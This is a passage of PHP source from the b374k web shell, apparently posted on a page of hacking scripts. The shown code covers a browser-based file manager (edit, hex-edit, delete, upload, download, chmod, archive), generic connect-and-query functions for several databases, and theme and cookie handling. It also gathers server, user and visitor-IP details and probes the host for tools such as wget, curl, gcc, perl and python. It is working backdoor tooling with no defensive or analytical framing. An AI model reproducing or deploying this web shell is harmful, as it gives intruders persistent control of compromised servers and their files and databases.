 565            }
 566            break;
 567        default:
 568            return false;
 569    }
 570    if(!empty($ver)) $s_s = $ver;
 571    return $s_s;
 572 }
 573 // find available archiver
 574 function get_archiver_available(){
 575    global $s_self, $s_tar;
 576 
 577    $s_dlfile = "";
 578    $s_avail_arc = array("raw" =&gt; "raw");
 579 
 580    if(class_exists("ZipArchive")) $s_avail_arc["ziparchive"] = "zip";
 581    if($s_tar){
 582        $s_avail_arc["tar"] = "tar";
 583        $s_avail_arc["targz"] = "tar.gz";
 584    }
 585 
 586    $s_option_arc = "";
 587    foreach($s_avail_arc as $s_t=&gt;$s_u) $s_option_arc .= "&lt;option value=\"".$s_t."\"&gt;".$s_u."&lt;/option&gt;";
 588 
 589    $s_dlfile .= "&lt;form action='".$s_self."' method='post'&gt;
 590               &lt;select onchange='download(this);' name='dltype' class='inputzbut' style='width:80px;height:20px;'&gt;
 591               &lt;option value='' disabled selected&gt;Download&lt;/option&gt;
 592               ".$s_option_arc."
 593               &lt;/select&gt;
 594               &lt;input type='hidden' name='dlpath' value='__dlpath__' /&gt;
 595               &lt;/form&gt;";
 596    return $s_dlfile;
 597 }
 598 // explorer, return a table of given dir
 599 function showdir($s_cwd){
 600    global $s_self, $s_win, $s_posix, $s_tar;
 601 
 602    $s_fname = $s_dname = array();
 603    $s_total_file = $s_total_dir = 0;
 604 
 605    if($s_dh = @opendir($s_cwd)){
 606        while($s_file = @readdir($s_dh)){
 607            if(@is_dir($s_file)) $s_dname[] = $s_file;
 608            elseif(@is_file($s_file))$s_fname[] = $s_file;
 609        }
 610        closedir($s_dh);
 611    }
 612 
 613    natcasesort($s_fname);
 614    natcasesort($s_dname);
 615    $s_list = array_merge($s_dname,$s_fname);
 616 
 617    if($s_win){
 618        //check if this root directory
 619        chdir("..");
 620        if(cp(getcwd())==cp($s_cwd)) array_unshift($s_list, ".");
 621        chdir($s_cwd);
 622    }
 623 
 624    $s_path = explode(DS,$s_cwd);
 625    $s_tree = sizeof($s_path);
 626 
 627    $s_parent = "";
 628    if($s_tree &gt; 2) for($s_i = 0; $s_i&lt;$s_tree-2; $s_i++) $s_parent .= $s_path[$s_i].DS;
 629    else $s_parent = $s_cwd;
 630 
 631    $s_owner_html = (!$s_win && $s_posix)? "&lt;th style='width:140px;min-width:140px;'&gt;owner:group&lt;/th&gt;":"";
 632    $s_colspan = (!$s_win && $s_posix)? "5" : "4";
 633    $s_buff = "
 634   &lt;table class='explore sortable'&gt;&lt;thead&gt;
 635   &lt;tr&gt;&lt;th style='width:24px;min-width:24px;' class='sorttable_nosort'&gt;&lt;/th&gt;&lt;th style='min-width:150px;'&gt;name&lt;/th&gt;&lt;th style='width:74px;min-width:74px;'&gt;size&lt;/th&gt;".$s_owner_html."&lt;th style='width:80px;min-width:80px;'&gt;perms&lt;/th&gt;&lt;th style='width:150px;min-width:150px;'&gt;modified&lt;/th&gt;&lt;th style='width:200px;min-width:200px;' class='sorttable_nosort'&gt;action&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;";
 636 
 637    $s_arc = get_archiver_available();
 638    foreach($s_list as $s_l){
 639        if(!$s_win && $s_posix){
 640            $s_name = posix_getpwuid(fileowner($s_l));
 641            $s_group = posix_getgrgid(filegroup($s_l));
 642            $s_owner = $s_name['name']."&lt;span class='gaya'&gt;:&lt;/span&gt;".$s_group['name'];
 643            $s_owner_html = "&lt;td style='text-align:center;'&gt;".$s_owner."&lt;/td&gt;";
 644        }
 645 
 646        $s_lhref = $s_lname = $s_laction = "";
 647        if(@is_dir($s_l)){
 648            if($s_l=="."){
 649                $s_lhref = $s_self."cd=".$s_cwd;
 650                $s_lsize = "LINK";
 651                $s_laction = "
 652               &lt;span id='titik1'&gt;
 653                   &lt;a href='".$s_self."cd=".$s_cwd."&find=".$s_cwd."'&gt;find&lt;/a&gt; | &lt;a href='".$s_self."cd=".$s_cwd."&x=upload'&gt;upl&lt;/a&gt; | &lt;a href='".$s_self."cd=".$s_cwd."&edit=".$s_cwd."newfile_1&new=yes'&gt;+file&lt;/a&gt; | &lt;a href=\"javascript:tukar('titik1','', 'mkdir','newfolder_1');\"&gt;+dir&lt;/a&gt;
 654               &lt;/span&gt;
 655               &lt;div id='titik1_form'&gt;&lt;/div&gt;";
 656            }
 657            elseif($s_l==".."){
 658                $s_lhref = $s_self."cd=".$s_parent;
 659                $s_lsize = "LINK";
 660                $s_laction = "
 661               &lt;span id='titik2'&gt;
 662                   &lt;a href='".$s_self."cd=".$s_parent."&find=".$s_parent."'&gt;find&lt;/a&gt; | &lt;a href='".$s_self."cd=".$s_parent."&x=upload'&gt;upl&lt;/a&gt; | &lt;a href='".$s_self."cd=".$s_parent."&edit=".$s_parent."newfile_1&new=yes'&gt;+file&lt;/a&gt; | &lt;a href=\"javascript:tukar('titik2','".adds($s_parent)."', 'mkdir','newfolder_1');\"&gt;+dir&lt;/a&gt;
 663               &lt;/span&gt;
 664               &lt;div id='titik2_form'&gt;&lt;/div&gt;";
 665            }
 666            else{
 667                $s_lhref = $s_self."cd=".$s_cwd.$s_l.DS;
 668                $s_lsize = "DIR";
 669                $s_laction = "
 670               &lt;span id='".cs($s_l)."_'&gt;
 671                   &lt;a href='".$s_self."cd=".$s_cwd.$s_l.DS."&find=".$s_cwd.$s_l.DS."'&gt;find&lt;/a&gt; | &lt;a href='".$s_self."cd=".$s_cwd.$s_l.DS."&x=upload'&gt;upl&lt;/a&gt; | &lt;a href=\"javascript:tukar('".cs($s_l)."_','','rename','".$s_l."','".$s_l."');\"&gt;ren&lt;/a&gt; | &lt;a href='".$s_self."cd=".$s_cwd."&del=".$s_l."'&gt;del&lt;/a&gt;
 672               &lt;/span&gt;
 673               &lt;div id='".cs($s_l)."__form'&gt;&lt;/div&gt;";
 674                $s_total_dir++;
 675            }
 676            $s_lname = "[ ".$s_l." ]";
 677            $s_lsizetit = "0";
 678            $s_lnametit = "dir : ".$s_l;
 679        }
 680        else{
 681            $s_lhref = $s_self."view=".$s_cwd.$s_l;
 682            $s_lname = $s_l;
 683            $s_lsize = gs($s_l);
 684            $s_lsizetit = @filesize($s_l);
 685            $s_lnametit = "file : ".$s_l;
 686            $s_laction = "
 687           &lt;span id='".cs($s_l)."_'&gt;
 688               &lt;a href='".$s_self."edit=".$s_cwd.$s_l."'&gt;edit&lt;/a&gt; | &lt;a href='".$s_self."hexedit=".$s_cwd.$s_l."'&gt;hex&lt;/a&gt; | &lt;a href=\"javascript:tukar('".cs($s_l)."_','','rename','".$s_l."','".$s_l."');\"&gt;ren&lt;/a&gt; | &lt;a href='".$s_self."del=".$s_cwd.$s_l."'&gt;del&lt;/a&gt; | &lt;a href='".$s_self."dl=".$s_cwd.$s_l."'&gt;dl&lt;/a&gt;
 689           &lt;/span&gt;
 690           &lt;div id='".cs($s_l)."__form'&gt;&lt;/div&gt;";
 691            $s_total_file++;
 692        }
 693 
 694        $s_cboxval = $s_cwd.$s_l;
 695        if($s_l=='.') $s_cboxval = $s_cwd;
 696        if($s_l=='..') $s_cboxval = $s_parent;
 697 
 698        $s_cboxes_id = substr(md5($s_lhref),0,8);
 699        $s_cboxes = "&lt;input id='".$s_cboxes_id."' name='cbox' value='".$s_cboxval."' type='checkbox' class='css-checkbox' onchange='hilite(this);' /&gt;
 700                   &lt;label for='".$s_cboxes_id."' class='css-label'&gt;&lt;/label&gt;";
 701 
 702        $s_ldl = str_replace("__dlpath__",$s_l,$s_arc);
 703        $s_ltime = filemtime($s_l);
 704        $s_buff .= "
 705       &lt;tr&gt;
 706       &lt;td style='text-align:center;text-indent:4px;'&gt;".$s_cboxes."&lt;/td&gt;
 707       &lt;td class='explorelist' title='".$s_lnametit."' ondblclick=\"return go('".adds($s_lhref)."',event);\"&gt;
 708           &lt;a href='".$s_lhref."'&gt;".$s_lname."&lt;/a&gt;
 709       &lt;/td&gt;
 710       &lt;td title='".$s_lsizetit."'&gt;".$s_lsize."&lt;/td&gt;
 711       ".$s_owner_html."
 712       &lt;td style='text-align:center;'&gt;".gp($s_l)."&lt;/td&gt;
 713       &lt;td style='text-align:center;' title='".$s_ltime."'&gt;".@date("d-M-Y H:i:s",$s_ltime)."&lt;/td&gt;
 714       &lt;td&gt;".$s_laction."&lt;/td&gt;
 715       &lt;/tr&gt;";
 716    }
 717    $s_buff .= "&lt;/tbody&gt;";
 718 
 719    $s_extract = ""; $s_compress = "";
 720    if(class_exists("ZipArchive")){
 721        $s_extract .= "&lt;option value='extractzip'&gt;extract (zip)&lt;/option&gt;";
 722        $s_compress .= "&lt;option value='compresszip'&gt;compress (zip)&lt;/option&gt;";
 723    }
 724    if($s_tar){
 725        $s_extract .= "&lt;option value='extracttar'&gt;extract (tar)&lt;/option&gt;&lt;option value='extracttargz'&gt;extract (tar.gz)&lt;/option&gt;";
 726        $s_compress .="&lt;option value='compresstar'&gt;compress (tar)&lt;/option&gt;&lt;option value='compresstargz'&gt;compress (tar.gz)&lt;/option&gt;";
 727    }
 728 
 729    $s_extcom = ($s_extract!="" && $s_compress!="")? $s_extract."&lt;option value='' disabled&gt;-&lt;/option&gt;".$s_compress:$s_extract.$s_compress;
 730 
 731    $s_buff .= "&lt;tfoot&gt;&lt;tr class='cbox_selected'&gt;
 732           &lt;td class='cbox_all'&gt;&lt;input id='checkalll' type='checkbox' name='abox' class='css-checkbox' onclick='checkall();' /&gt; &lt;label for='checkalll' class='css-label'&gt;&lt;/label&gt;&lt;/td&gt;
 733           &lt;td&gt;
 734           &lt;form action='".$s_self."' method='post'&gt;
 735           &lt;select id='massact' class='inputzbut' onchange='massactgo();' style='width:100%;height:20px;margin:0;'&gt;
 736               &lt;option value='' disabled selected&gt;Action&lt;/option&gt;
 737               &lt;option value='cut'&gt;cut&lt;/option&gt;
 738               &lt;option value='copy'&gt;copy&lt;/option&gt;
 739               &lt;option value='paste'&gt;paste&lt;/option&gt;
 740               &lt;option value='delete'&gt;delete&lt;/option&gt;
 741               &lt;option value='' disabled&gt;-&lt;/option&gt;
 742               &lt;option value='chmod'&gt;chmod&lt;/option&gt;
 743               &lt;option value='touch'&gt;touch&lt;/option&gt;
 744               &lt;option value='' disabled&gt;-&lt;/option&gt;
 745               ".$s_extcom."
 746           &lt;/select&gt;
 747           &lt;noscript&gt;&lt;input type='button' value='Go !' class='inputzbut' onclick='massactgo();' /&gt;&lt;/noscript&gt;&lt;/form&gt;
 748           &lt;/td&gt;&lt;td colspan='".$s_colspan."' style='text-align:left;'&gt;Total : ".$s_total_file." files, ".$s_total_dir." Directories&lt;span id='total_selected'&gt;&lt;/span&gt;&lt;/td&gt;
 749           &lt;/tr&gt;&lt;/tfoot&gt;
 750           &lt;/table&gt;";
 751 
 752    return $s_buff;
 753 }
 754 //database related functions
 755 function sql_connect($s_sqltype, $s_sqlhost, $s_sqluser, $s_sqlpass){
 756    if($s_sqltype == 'mysql'){ if(function_exists('mysql_connect')) return @mysql_connect($s_sqlhost, $s_sqluser, $s_sqlpass); }
 757    elseif($s_sqltype == 'mssql'){
 758        if(function_exists('mssql_connect')) return @mssql_connect($s_sqlhost, $s_sqluser, $s_sqlpass);
 759        elseif(function_exists('sqlsrv_connect')){
 760            $s_coninfo = array("UID"=&gt;$s_sqluser, "PWD"=&gt;$s_sqlpass);
 761            return @sqlsrv_connect($s_sqlhost,$s_coninfo);
 762        }
 763    }
 764    elseif($s_sqltype == 'pgsql'){
 765        $s_hosts = explode(":", $s_sqlhost);
 766        if(count($s_hosts)==2){
 767            $s_host_str = "host=".$s_hosts[0]." port=".$s_hosts[1];
 768        }
 769        else $s_host_str = "host=".$s_sqlhost;
 770        if(function_exists('pg_connect')) return @pg_connect("$s_host_str user=$s_sqluser password=$s_sqlpass");
 771    }
 772    elseif($s_sqltype == 'oracle'){ if(function_exists('oci_connect')) return @oci_connect($s_sqluser, $s_sqlpass, $s_sqlhost); }
 773    elseif($s_sqltype == 'sqlite3'){
 774        if(class_exists('SQLite3')) if(!empty($s_sqlhost)) return new SQLite3($s_sqlhost);
 775        else return false;
 776    }
 777    elseif($s_sqltype == 'sqlite'){ if(function_exists('sqlite_open')) return @sqlite_open($s_sqlhost); }
 778    elseif($s_sqltype == 'odbc'){ if(function_exists('odbc_connect')) return @odbc_connect($s_sqlhost, $s_sqluser, $s_sqlpass); }
 779    elseif($s_sqltype == 'pdo'){
 780        if(class_exists('PDO')) if(!empty($s_sqlhost)) return new PDO($s_sqlhost, $s_sqluser, $s_sqlpass);
 781        else return false;
 782    }
 783    return false;
 784 }
 785 function sql_query($s_sqltype, $s_query, $s_con){
 786    if($s_sqltype == 'mysql') return mysql_query($s_query);
 787    elseif($s_sqltype == 'mssql'){
 788        if(function_exists('mssql_query')) return mssql_query($s_query);
 789        elseif(function_exists('sqlsrv_query')) return sqlsrv_query($s_con,$s_query);
 790    }
 791    elseif($s_sqltype == 'pgsql') return pg_query($s_query);
 792    elseif($s_sqltype == 'oracle') return oci_execute(oci_parse($s_con, $s_query));
 793    elseif($s_sqltype == 'sqlite3') return $s_con-&gt;query($s_query);
 794    elseif($s_sqltype == 'sqlite') return sqlite_query($s_con, $s_query);
 795    elseif($s_sqltype == 'odbc') return odbc_exec($s_con, $s_query);
 796    elseif($s_sqltype == 'pdo') return $s_con-&gt;query($s_query);
 797 }
 798 function sql_num_fields($s_sqltype, $s_hasil){
 799    if($s_sqltype == 'mysql') return mysql_num_fields($s_hasil);
 800    elseif($s_sqltype == 'mssql'){
 801        if(function_exists('mssql_num_fields')) return mssql_num_fields($s_hasil);
 802        elseif(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($s_hasil);
 803    }
 804    elseif($s_sqltype == 'pgsql') return pg_num_fields($s_hasil);
 805    elseif($s_sqltype == 'oracle') return oci_num_fields($s_hasil);
 806    elseif($s_sqltype == 'sqlite3') return $s_hasil-&gt;numColumns();
 807    elseif($s_sqltype == 'sqlite') return sqlite_num_fields($s_hasil);
 808    elseif($s_sqltype == 'odbc') return odbc_num_fields($s_hasil);
 809    elseif($s_sqltype == 'pdo') return $s_hasil-&gt;columnCount();
 810 }
 811 function sql_field_name($s_sqltype,$s_hasil,$s_i){
 812    if($s_sqltype == 'mysql') return mysql_field_name($s_hasil,$s_i);
 813    elseif($s_sqltype == 'mssql'){
 814        if(function_exists('mssql_field_name')) return mssql_field_name($s_hasil,$s_i);
 815        elseif(function_exists('sqlsrv_field_metadata')){
 816            $s_metadata = sqlsrv_field_metadata($s_hasil);
 817            if(is_array($s_metadata)){
 818                $s_metadata=$s_metadata[$s_i];
 819            }
 820            if(is_array($s_metadata)) return $s_metadata['Name'];
 821        }
 822    }
 823    elseif($s_sqltype == 'pgsql') return pg_field_name($s_hasil,$s_i);
 824    elseif($s_sqltype == 'oracle') return oci_field_name($s_hasil,$s_i+1);
 825    elseif($s_sqltype == 'sqlite3') return $s_hasil-&gt;columnName($s_i);
 826    elseif($s_sqltype == 'sqlite') return sqlite_field_name($s_hasil,$s_i);
 827    elseif($s_sqltype == 'odbc') return odbc_field_name($s_hasil,$s_i+1);
 828    elseif($s_sqltype == 'pdo'){
 829        $s_res = $s_hasil-&gt;getColumnMeta($s_i);
 830        return $s_res['name'];
 831    }
 832 }
 833 function sql_fetch_data($s_sqltype,$s_hasil){
 834    if($s_sqltype == 'mysql') return mysql_fetch_row($s_hasil);
 835    elseif($s_sqltype == 'mssql'){
 836        if(function_exists('mssql_fetch_row')) return mssql_fetch_row($s_hasil);
 837        elseif(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($s_hasil,1);
 838    }
 839    elseif($s_sqltype == 'pgsql') return pg_fetch_row($s_hasil);
 840    elseif($s_sqltype == 'oracle') return oci_fetch_row($s_hasil);
 841    elseif($s_sqltype == 'sqlite3') return $s_hasil-&gt;fetchArray(1);
 842    elseif($s_sqltype == 'sqlite') return sqlite_fetch_array($s_hasil,1);
 843    elseif($s_sqltype == 'odbc') return odbc_fetch_array($s_hasil);
 844    elseif($s_sqltype == 'pdo') return $s_hasil-&gt;fetch(2);
 845 }
 846 function sql_num_rows($s_sqltype,$s_hasil){
 847    if($s_sqltype == 'mysql') return mysql_num_rows($s_hasil);
 848    elseif($s_sqltype == 'mssql'){
 849        if(function_exists('mssql_num_rows')) return mssql_num_rows($s_hasil);
 850        elseif(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($s_hasil);
 851    }
 852    elseif($s_sqltype == 'pgsql') return pg_num_rows($s_hasil);
 853    elseif($s_sqltype == 'oracle') return oci_num_rows($s_hasil);
 854    elseif($s_sqltype == 'sqlite3'){
 855        $s_metadata = $s_hasil-&gt;fetchArray();
 856        if(is_array($s_metadata)) return $s_metadata['count'];
 857    }
 858    elseif($s_sqltype == 'sqlite') return sqlite_num_rows($s_hasil);
 859    elseif($s_sqltype == 'odbc') return odbc_num_rows($s_hasil);
 860    elseif($s_sqltype == 'pdo') return $s_hasil-&gt;rowCount();
 861 }
 862 function sql_close($s_sqltype,$s_con){
 863    if($s_sqltype == 'mysql') return mysql_close($s_con);
 864    elseif($s_sqltype == 'mssql'){
 865        if(function_exists('mssql_close')) return mssql_close($s_con);
 866        elseif(function_exists('sqlsrv_close')) return sqlsrv_close($s_con);
 867    }
 868    elseif($s_sqltype == 'pgsql') return pg_close($s_con);
 869    elseif($s_sqltype == 'oracle') return oci_close($s_con);
 870    elseif($s_sqltype == 'sqlite3') return $s_con-&gt;close();
 871    elseif($s_sqltype == 'sqlite') return sqlite_close($s_con);
 872    elseif($s_sqltype == 'odbc') return odbc_close($s_con);
 873    elseif($s_sqltype == 'pdo') return $s_con = null;
 874 }
 875 if(!function_exists('str_split')){
 876    function str_split($s_t,$s_s=1){
 877        $s_a = array();
 878        for($s_i = 0; $s_i&lt;strlen($s_t);){
 879            $s_a[] = substr($s_t,$s_i,$s_s);
 880            $s_i += $s_s;
 881        }
 882        return $s_a;
 883    }
 884 }
 885 
 886 // appearance
 887 $s_theme = "dark"; // default is dark
 888 if(isset($_COOKIE['theme'])) $s_theme = $_COOKIE['theme'];
 889 if(isset($_GP['x']) && ($_GP['x']=='switch')){
 890    if(isset($_COOKIE['theme'])) $s_theme = $_COOKIE['theme'];
 891    if($s_theme=="bright") $s_theme = "dark";
 892    else $s_theme = "bright";
 893    setcookie("theme", $s_theme ,time() + $s_login_time);
 894 }
 895 
 896 $s_dark = array("#000000", "#FFFFFF", "#222222", "#4C9CAF", "#111111", "#AAAAAA", "#292929", "#363636", "#191919", "#444444", "#CCCCCC", "#999999", "#202020");
 897 $s_bright = array("#FFFFFF", "#000000", "#DDDDDD", "#B36350", "#EEEEEE", "#555555", "#D6D6D6", "#C9C9C9", "#E6E6E6", "#BBBBBB", "#333333", "#666666", "#DFDFDF");
 898 $s_highlight_dark = array("4C9CAF", "888888", "87DF45", "EEEEEE" , "FF8000");
 899 $s_highlight_bright = array("B36350", "777777", "7820BA", "111111" , "007FFF");
 900 $s_color = ($s_theme=="bright")? $s_bright:$s_dark;
 901 $s_checkbox = ($s_theme=="bright")? $s_bright_cb:$s_dark_cb;
 902 
 903 global $s_self, $s_win, $s_posix;
 904 
 905 $s_self = "?";
 906 $s_cek1 = basename($_SERVER['SCRIPT_FILENAME']);
 907 $s_cek2 = substr(basename(__FILE__),0,strlen($s_cek1));
 908 
 909 if(isset($_COOKIE['b374k_included'])){
 910    if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
 911    else{
 912        $s_self = "?";
 913        setcookie("b374k_included", "0" ,time() - $s_login_time);
 914        setcookie("s_self", $s_self ,time() + $s_login_time);
 915    }
 916 }
 917 else{
 918    if(strcmp($s_cek1,$s_cek2)!=0){
 919        if(!isset($_COOKIE['s_home'])){
 920            $s_home = "?".$_SERVER["QUERY_STRING"]."&";
 921            setcookie("s_home", $s_home ,time() + $s_login_time);
 922        }
 923        if(isset($s_home)) $s_self = $s_home;
 924        elseif(isset($_COOKIE['s_home'])) $s_self = $_COOKIE['s_home'];
 925        setcookie("b374k_included", "1" ,time() + $s_login_time);
 926        setcookie("s_self", $s_self ,time() + $s_login_time);
 927    }
 928    else{
 929        $s_self = "?";
 930        setcookie("b374k_included", "0" ,time() - $s_login_time);
 931        setcookie("s_self", $s_self ,time() + $s_login_time);
 932    }
 933 }
 934 
 935 if($s_auth){
 936    // server software
 937    $s_software = getenv("SERVER_SOFTWARE");
 938    // uname -a
 939    $s_system = php_uname();
 940    // check os
 941    $s_win = (strtolower(substr($s_system,0,3)) == "win")? true : false;
 942    // check for posix
 943    $s_posix = (function_exists("posix_getpwuid"))? true : false;
 944    // change working directory
 945    if(isset($_GP['cd'])){
 946        $s_dd = $_GP['cd'];
 947        if(@is_dir($s_dd)){
 948            $s_cwd = cp($s_dd);
 949            chdir($s_cwd);
 950            setcookie("cwd", $s_cwd ,time() + $s_login_time);
 951        }
 952    }
 953    else{
 954        if(isset($_COOKIE['cwd'])){
 955            $s_dd = ss($_COOKIE['cwd']);
 956            if(@is_dir($s_dd)){
 957                $s_cwd = cp($s_dd);
 958                chdir($s_cwd);
 959            }
 960        }
 961        else $s_cwd = cp(getcwd());
 962    }
 963 
 964    if(!$s_win && $s_posix){
 965        $s_userarr = posix_getpwuid(posix_geteuid());
 966        if(isset($s_userarr['name'])) $s_user = $s_userarr['name'];
 967        else $s_user = "$";
 968    }
 969    else {
 970        $s_user = get_current_user();
 971    }
 972 
 973    // prompt style
 974    $s_prompt = $s_user." &gt;";
 975    // server ip
 976    $s_server_ip = gethostbyname($_SERVER["HTTP_HOST"]);
 977    // your ip <img src="/HackingScripts/wp-includes/images/smilies/icon_wink.gif" alt=";-)" class="wp-smiley" />
 978    $s_my_ip = $_SERVER['REMOTE_ADDR'];
 979    $s_result = "";
 980 
 981    global $s_python, $s_perl, $s_ruby, $s_node, $s_gcc, $s_java, $s_tar, $s_wget, $s_lwpdownload, $s_lynx, $s_curl;
 982 
 983    $s_access = array("s_python", "s_perl", "s_ruby", "s_node", "s_gcc", "s_java", "s_tar", "s_wget", "s_lwpdownload", "s_lynx", "s_curl");
 984    foreach($s_access as $s){
 985        if(isset($_COOKIE[$s])){ $$s = $_COOKIE[$s]; }
 986        else{
 987            if(!isset($_COOKIE['b374k'])){
 988                $t = explode("_", $s);
 989                $t = check_access($t[1]);
 990                if($t!==false){
 991                    $$s = $t;
 992                    setcookie($s, $$s ,time() + $s_login_time);
 993                }
